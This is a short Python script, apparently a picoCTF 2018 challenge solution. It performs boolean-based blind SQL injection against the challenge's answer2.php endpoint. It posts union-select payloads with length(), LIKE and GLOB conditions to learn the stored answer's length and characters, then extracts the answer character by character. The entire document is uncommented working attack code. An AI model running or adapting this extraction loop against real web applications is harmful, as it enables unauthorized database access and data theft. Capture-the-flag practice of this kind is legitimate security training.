import requests
q="abcdefghijklmnopqrstuvwxyz1234567890!@#$^&*()+-=.,<>?/[]"
w=""
a=""
l=0

#Find out length of column
for _ in range(100):
    d = {'answer':"'union select * from answers where answer='' or length(answer)={}--".format(_)}
    r=requests.post('http://2018shell.picoctf.com:2644/answer2.php',data=d).text
    if 'close' in r:
        l=_
        break
print(l)

#Find out characters inside columns
for _ in q:
    d = {'answer':"'union select * from answers where answer like '%{}%'--".format(_)}
    r=requests.post('http://2018shell.picoctf.com:2644/answer2.php',data=d).text
    if 'close' in r:
        w+=_       
print(w)

#Add uppercase characters to new wordlist
for _ in w:
    if _.upper() not in w:
        w+=_.upper()
print(w)

for q in range(l):
    for _ in w:
        d = {'answer':"'union select * from answers where answer glob '{}*'--".format(a+_)}
        r=requests.post('http://2018shell.picoctf.com:2644/answer2.php',data=d).text
        if 'close' in r:
            a+=_
            print(a)
            break
